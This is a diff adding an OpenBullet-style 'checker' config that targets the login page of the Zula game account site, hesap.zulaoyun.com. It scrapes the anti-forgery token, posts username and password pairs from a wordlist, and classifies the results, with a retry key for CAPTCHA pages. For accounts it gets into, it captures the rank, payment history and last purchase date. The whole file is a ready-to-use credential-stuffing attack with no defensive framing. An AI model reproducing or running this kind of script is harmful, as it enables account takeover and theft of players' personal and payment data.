@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "KokoZula",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-30T15:38:41.2788008+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "Koko789456h",
+  "Version": "1.2.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET-TOKEN REQUEST GET "https://hesap.zulaoyun.com/Account/Login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,tr;q=0.8" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 241" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://hesap.zulaoyun.com" 
+  HEADER "referer: https://hesap.zulaoyun.com/Account/Login?ReturnUrl=%2F" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
+#token PARSE "<SOURCE>" LR "name=\"__RequestVerificationToken\" type=\"hidden\" value=\"" "\" />" -> VAR "token" 
+#LOGİN REQUEST POST "https://hesap.zulaoyun.com/Account/Login" 
+  CONTENT "ReturnUrl=%2F&UserName=<USER>&Password=<PASS>&__RequestVerificationToken=<token>&RememberMe=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,tr;q=0.8" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 241" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://hesap.zulaoyun.com" 
+  HEADER "referer: https://hesap.zulaoyun.com/Account/Login?ReturnUrl=%2F" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Beni hatırla" 
+  KEYCHAIN Success OR 
+    KEY "href=\"/Account/LogOut\"" 
+  KEYCHAIN Retry OR 
+    KEY "Why do I have to complete a CAPTCHA?" 
+REQUEST GET "https://hesap.zulaoyun.com/profil" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<div class=\"progress-bar-text\">" "</div>" -> CAP "Rütbe" 
+REQUEST GET "https://hesap.zulaoyun.com/profil/odeme-gecmisi" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "label>" "</label> </a>" -> CAP "Ödeme Geçmişi" 
+PARSE "<SOURCE>" LR "<td>" "<a href=\"#\">" -> CAP "Son Alınan Ürün Tarihi" 
